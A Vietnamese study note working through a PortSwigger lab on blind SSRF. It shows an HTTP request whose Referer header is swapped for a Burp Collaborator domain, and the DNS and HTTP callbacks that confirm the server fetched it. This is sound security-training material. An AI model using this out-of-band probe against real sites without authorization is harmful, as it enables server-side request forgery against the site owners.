![[lab-blind-ssrf-collaborator.png]]
chèn Collaborator vào Referer, không thấy response nhưng vẫn confirm được SSRF

> [!NOTE] phân tích đề
> - trang product có analytics software
> - nó fetch URL trong Referer header mỗi lần load product
> - không trả response về => blind
> - firewall chặn request ra ngoài bừa bãi
> -> bắt buộc dùng Burp Collaborator public server
> -> đọc thêm ở [[Blind SSRF là gì, kịch bản tấn công]] và [[blind ssrf]]

### hướng giải
- [ ] mở product, bắt GET /product?productId=1
- [ ] quăng qua Repeater
- [ ] mở Collaborator, Copy to clipboard
- [ ] thay domain trong Referer bằng payload Collaborator
- [ ] Send rồi qua Collaborator bấm Poll now
- [ ] thấy DNS + HTTP là win

### giải
request gốc:
```http
GET /product?productId=1 HTTP/1.1
Host: <lab-id>.web-security-academy.net
Referer: https://<lab-id>.web-security-academy.net/
```

đổi thành:
```http
GET /product?productId=1 HTTP/1.1
Host: <lab-id>.web-security-academy.net
Referer: https://abc123xyz.oastify.com
```
-> Send

qua tab Collaborator -> Poll now
-> mình thấy:
```
DNS lookup for abc123xyz.oastify.com
HTTP request to abc123xyz.oastify.com
```
=> backend đã fetch hộ mình
=> lab solved ngay khi có HTTP interaction

![[lab-blind-ssrf-collaborator-result.png]]

> [!NOTE] bài học
> - blind thì đừng hóng response, hóng callback
> - chỉ có DNS mà không có HTTP => fetch bị chặn ở tầng mạng, vẫn tính là có SSRF
> - có cả DNS + HTTP => khai thác sâu được
> - nên mình luôn thử Referer / User-Agent / webhook khi nghi blind
